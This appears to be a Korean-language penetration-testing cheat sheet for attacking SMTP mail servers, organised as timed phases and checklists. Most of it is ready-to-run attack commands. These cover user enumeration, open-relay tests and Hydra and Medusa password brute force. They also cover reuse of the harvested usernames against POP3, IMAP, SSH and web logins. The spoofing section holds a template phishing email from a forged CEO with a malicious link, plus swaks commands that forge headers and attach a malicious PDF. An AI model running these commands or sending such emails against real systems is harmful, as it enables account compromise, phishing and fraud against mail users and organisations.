# 📧 SMTP ATTACKS (Port 25)

> **목표: SMTP 서비스 발견 후 15-20분 내에 사용자 정보 수집 또는 메일 시스템 악용**

## ⚡ 즉시 실행할 명령어들

### 🚀 SMTP 발견 즉시 실행

```bash
# 1. SMTP 배너 및 버전 확인
nmap -sV -p 25 {IP}
nc -nv {IP} 25
telnet {IP} 25

# 2. SMTP NSE 스크립트 실행
nmap --script smtp-* -p 25 {IP}

# 3. 사용자 열거 도구 실행
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {IP}

# 4. 빠른 수동 사용자 확인
telnet {IP} 25
HELO test
VRFY root
VRFY admin
VRFY user
QUIT

# 5. 메일 릴레이 테스트
nmap --script smtp-open-relay -p 25 {IP}
```

### ⚡ 기본 SMTP 명령어 테스트

```bash
# telnet으로 SMTP 연결
telnet {IP} 25

# 기본 명령어 시퀀스:
HELO attacker.com
MAIL FROM: test@attacker.com
RCPT TO: root@{IP}
RCPT TO: admin@{IP}
RCPT TO: postmaster@{IP}
DATA
Subject: Test

This is a test message.
.
QUIT
```

---

## 📋 단계별 체크리스트

### 🎯 Phase 1: 발견 및 기본 정보 수집 (5분)

- [ ] **SMTP 포트 확인** `nmap -p 25 {IP}`
- [ ] **SMTP 버전 및 배너 확인** `nmap -sV -p 25 {IP}`
- [ ] **기본 연결 테스트** `telnet {IP} 25`
- [ ] **지원하는 명령어 확인** `HELP` 명령어 실행
- [ ] **서버 정보 수집** `HELO` 응답 분석

### 🔍 Phase 2: 사용자 열거 (7분)

- [ ] **VRFY 명령어로 사용자 존재 확인**
- [ ] **EXPN 명령어로 메일링 리스트 확인**
- [ ] **RCPT TO 명령어로 사용자 열거**
- [ ] **자동화 도구로 사용자 목록 수집**
- [ ] **일반적인 계정명 확인** (postmaster, webmaster, admin)

### 🔧 Phase 3: 메일 시스템 테스트 (5분)

- [ ] **메일 릴레이 가능성 확인**
- [ ] **스푸핑 가능성 테스트**
- [ ] **인증 방법 확인** (AUTH 명령어)
- [ ] **TLS/SSL 지원 확인** (STARTTLS)
- [ ] **메일 큐 정보 확인**

### 💥 Phase 4: 공격 및 악용 (3분)

- [ ] **브루트포스 공격 시도** (인증이 필요한 경우)
- [ ] **메일 스푸핑 공격**
- [ ] **피싱 메일 전송 테스트**
- [ ] **다른 서비스와 연계**
- [ ] **내부 정보 수집**

---

## 🎯 상황별 대응

### 👥 사용자 열거 공격

```bash
# VRFY 명령어를 이용한 사용자 열거
telnet {IP} 25
HELO attacker.com
VRFY root
VRFY admin
VRFY user
VRFY test
VRFY guest
VRFY postmaster
VRFY webmaster
VRFY mail
VRFY www
VRFY ftp

# EXPN 명령어를 이용한 메일링 리스트 확인
EXPN all
EXPN users
EXPN admin
EXPN root

# RCPT TO를 이용한 사용자 열거
MAIL FROM: test@test.com
RCPT TO: root@{IP}
RCPT TO: admin@{IP}
RCPT TO: user@{IP}
RCPT TO: test@{IP}

# 자동화된 사용자 열거
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {IP}
smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t {IP}
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t {IP}

# 커스텀 사용자 리스트로 열거
smtp-user-enum -M VRFY -U custom_users.txt -t {IP}

# 대소문자 변형 테스트
smtp-user-enum -M VRFY -u root,ROOT,Root,admin,ADMIN,Admin -t {IP}
```

### 📬 메일 릴레이 테스트

```bash
# Nmap을 이용한 릴레이 테스트
nmap --script smtp-open-relay -p 25 {IP}

# 수동 릴레이 테스트
telnet {IP} 25
HELO attacker.com
MAIL FROM: spoof@external.com
RCPT TO: victim@external.com
DATA
Subject: Relay Test

This is a relay test.
.
QUIT

# 다양한 릴레이 패턴 테스트
# 패턴 1: 완전한 외부 주소
MAIL FROM: attacker@evil.com
RCPT TO: victim@external.com

# 패턴 2: 내부에서 외부로
MAIL FROM: root@{IP}
RCPT TO: victim@external.com

# 패턴 3: 외부에서 내부로
MAIL FROM: attacker@evil.com
RCPT TO: root@{IP}

# 패턴 4: @ 기호 우회 시도
RCPT TO: victim%external.com@{IP}
RCPT TO: victim@external.com@{IP}
RCPT TO: "@external.com:victim@target.com"
```

### 🎭 메일 스푸핑 공격

```bash
# 기본 스푸핑
telnet {IP} 25
HELO legitimate-domain.com
MAIL FROM: ceo@company.com
RCPT TO: employee@company.com
DATA
From: CEO <ceo@company.com>
To: Employee <employee@company.com>
Subject: Urgent - Password Reset Required

Please reset your password immediately by clicking the link below:
http://malicious-site.com/reset

Best regards,
CEO
.
QUIT

# 다양한 스푸핑 헤더 조작
DATA
From: "Legitimate User" <admin@company.com>
Reply-To: attacker@evil.com
Return-Path: attacker@evil.com
Subject: Important Security Update

[피싱 내용]
.

# swaks를 이용한 고급 스푸핑
swaks --to victim@company.com --from ceo@company.com --server {IP} --body "Please click this link"
swaks --to victim@company.com --from ceo@company.com --server {IP} --attach malicious.pdf
```

### 🔐 SMTP 인증 공격

```bash
# AUTH 명령어 지원 확인
telnet {IP} 25
EHLO attacker.com
# AUTH 옵션 확인

# 기본 자격증명 시도
AUTH LOGIN
# Username (base64): admin -> YWRtaW4=
# Password (base64): password -> cGFzc3dvcmQ=

# 다양한 인코딩으로 브루트포스
echo -n "admin" | base64
echo -n "password" | base64
echo -n "root" | base64
echo -n "123456" | base64

# Hydra를 이용한 SMTP 브루트포스
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://{IP}
hydra -L users.txt -P passwords.txt smtp://{IP}

# 다양한 인증 방법 시도
hydra -l admin -p password smtp://{IP} -s 25 -f -V

# Medusa를 이용한 브루트포스
medusa -h {IP} -u admin -P /usr/share/wordlists/rockyou.txt -M smtp
```

### 📋 SMTP 명령어 열거

```bash
# 지원하는 명령어 확인
telnet {IP} 25
HELP
EHLO attacker.com

# 확장 명령어 테스트
EHLO attacker.com
# 응답에서 지원하는 확장 기능 확인:
# 250-AUTH LOGIN PLAIN
# 250-STARTTLS
# 250-SIZE 10240000
# 250 HELP

# 다양한 명령어 시도
NOOP
RSET
HELO
EHLO
MAIL FROM:
RCPT TO:
DATA
VRFY
EXPN
HELP
QUIT
TURN
ETRN
```

---

## 🚨 문제 해결

### 🚫 연결 거부시

```bash
# 다른 SMTP 포트 확인
nmap -p 25,465,587,2525 {IP}

# SMTPS (암호화된 SMTP) 확인
nmap -p 465 {IP}
openssl s_client -connect {IP}:465
openssl s_client -starttls smtp -connect {IP}:587

# 다른 메일 포트들 확인
nmap -p 25,110,143,465,587,993,995 {IP}
```

### 🔒 인증 필요시

```bash
# STARTTLS 사용
telnet {IP} 587
EHLO attacker.com
STARTTLS

# 암호화된 연결
openssl s_client -starttls smtp -connect {IP}:587
openssl s_client -connect {IP}:465

# 다른 포트로 인증 시도
telnet {IP} 587  # Submission port
EHLO attacker.com
AUTH LOGIN
```

### 📵 사용자 열거 차단시

```bash
# 다른 방법으로 사용자 열거
# RCPT TO 방법
MAIL FROM: test@test.com
RCPT TO: root@localhost
RCPT TO: admin@localhost

# 타이밍 공격
#!/bin/bash
for user in root admin user test; do
    time_start=$(date +%s%N)
    echo "VRFY $user" | nc {IP} 25
    time_end=$(date +%s%N)
    echo "$user: $((($time_end - $time_start)/1000000)) ms"
done

# 에러 메시지 분석
echo "VRFY existinguser" | nc {IP} 25
echo "VRFY nonexistentuser123456" | nc {IP} 25
```

### 🐌 느린 응답시

```bash
# 타임아웃 설정
timeout 10 telnet {IP} 25

# 빠른 사용자 열거
smtp-user-enum -M VRFY -U users.txt -t {IP} -w 5

# 병렬 처리
#!/bin/bash
users="root admin user test guest"
for user in $users; do
    (echo "VRFY $user"; sleep 1; echo "QUIT") | nc {IP} 25 &
done
wait
```

### 🔍 정보 부족시

```bash
# 상세한 배너 정보 수집
nc -nv {IP} 25 | head -5
telnet {IP} 25

# 다양한 HELO/EHLO로 정보 수집
telnet {IP} 25
HELO localhost
QUIT

telnet {IP} 25
EHLO localhost
QUIT

# 서버 응답 분석
echo -e "HELO test\nQUIT" | nc {IP} 25
echo -e "EHLO test\nQUIT" | nc {IP} 25
```

---

## 🔗 다른 서비스와 연계

### 🌐 웹 서비스와 연계

```bash
# 웹메일 인터페이스 확인
curl http://{IP}/webmail
curl http://{IP}/mail
curl http://{IP}/roundcube
curl http://{IP}/squirrelmail

# SMTP로 수집한 사용자로 웹 로그인 시도
# users.txt에서 발견한 사용자들로:
hydra -L smtp_users.txt -P passwords.txt http-post-form://{IP}/login.php

# 웹을 통한 메일 전송
curl -X POST -d "to=victim@company.com&from=admin@company.com&subject=test&body=test" http://{IP}/sendmail.php
```

### 📬 POP3/IMAP과 연계

```bash
# SMTP에서 발견한 사용자로 POP3/IMAP 접근
telnet {IP} 110  # POP3
USER root
PASS password

telnet {IP} 143  # IMAP
LOGIN root password

# 브루트포스 연계
hydra -L smtp_users.txt -P passwords.txt pop3://{IP}
hydra -L smtp_users.txt -P passwords.txt imap://{IP}
```

### 🗂️ 파일 서비스와 연계

```bash
# SMTP 사용자명으로 다른 서비스 접근
ssh root@{IP}
ftp {IP}  # 발견한 사용자명으로 로그인 시도

# SMB 공유에서 메일 관련 파일 확인
smbclient //{IP}/mail -N
smbclient //{IP}/postfix -N
```

### 🗄️ 데이터베이스와 연계

```bash
# 메일 시스템 데이터베이스 접근 시도
mysql -h {IP} -u mail -p
mysql -h {IP} -u postfix -p
mysql -h {IP} -u roundcube -p

# PostgreSQL 시도
psql -h {IP} -U mail
psql -h {IP} -U postfix
```

---

## 🎯 특정 메일 서버별 공격

### 📮 Postfix

```bash
# Postfix 정보 수집
telnet {IP} 25
EHLO test
# 220 hostname ESMTP Postfix 확인

# Postfix 설정 파일 위치 (다른 서비스에서 접근 가능한 경우)
/etc/postfix/main.cf
/etc/postfix/master.cf
/etc/aliases

# Postfix 로그 확인
/var/log/mail.log
/var/log/maillog
```

### 📨 Sendmail

```bash
# Sendmail 버전 확인
telnet {IP} 25
# 220 hostname ESMTP Sendmail 확인

# Sendmail 취약점 확인
nmap --script smtp-vuln-cve2010-4344 -p 25 {IP}

# Sendmail 설정 파일
/etc/sendmail.cf
/etc/mail/sendmail.cf
```

### 📧 Microsoft Exchange

```bash
# Exchange 서버 확인
telnet {IP} 25
# Microsoft ESMTP MAIL Service 확인

# Exchange 관련 포트 확인
nmap -p 25,110,143,443,993,995,5985,5986 {IP}

# OWA (Outlook Web Access) 확인
curl https://{IP}/owa
curl https://{IP}/exchange
```

---

## 🛠️ 고급 SMTP 공격 기법

### 📊 메일 헤더 조작

```bash
# swaks를 이용한 고급 헤더 조작
swaks --to victim@company.com \
      --from ceo@company.com \
      --server {IP} \
      --header "Reply-To: attacker@evil.com" \
      --header "Return-Path: attacker@evil.com" \
      --body "Click this link: http://evil.com"

# 첨부파일과 함께 전송
swaks --to victim@company.com \
      --from admin@company.com \
      --server {IP} \
      --attach @malicious.pdf \
      --body "Please review the attached document"
```

### 🔄 메일 큐 조작

```bash
# 메일 큐 정보 확인 (접근 가능한 경우)
mailq
postqueue -p

# 큐 조작 (관리자 권한 필요)
postsuper -d ALL
postsuper -r ALL
```

---

## ⏱️ 시간 관리 가이드

### 🎯 5분 안에 완료할 것들

- [ ] SMTP 기본 정보 및 버전 확인
- [ ] 사용자 열거 도구 실행
- [ ] 기본 릴레이 테스트
- [ ] 주요 계정 수동 확인 (root, admin, postmaster)

### 🔍 15분 안에 완료할 것들

- [ ] 모든 사용자 열거 완료
- [ ] 메일 릴레이 및 스푸핑 테스트
- [ ] 인증 방법 확인 및 브루트포스 시작
- [ ] 다른 메일 관련 서비스 확인

### 💥 20분 후 판단 기준

**성공 기준:**

- [ ] 유효한 사용자 계정 목록 수집 완료
- [ ] 메일 릴레이 또는 스푸핑 가능
- [ ] 인증 우회 또는 크레덴셜 확보
- [ ] 다른 서비스 연계 가능성 확인

**실패시 다음 단계:**

- [ ] 수집한 사용자 정보를 다른 서비스에 활용
- [ ] 브루트포스를 백그라운드로 계속 실행
- [ ] 웹메일이나 POP3/IMAP 서비스 확인
- [ ] 다른 포트/서비스로 이동

**다음 단계**:

- 성공시 수집한 정보로 다른 서비스 공격
- 웹메일 발견시 `PORT-ATTACKS/80-443-web.md`로
- POP3/IMAP 발견시 해당 포트 공격으로
- 실패시 다른 `PORT-ATTACKS/` 파일로 이동
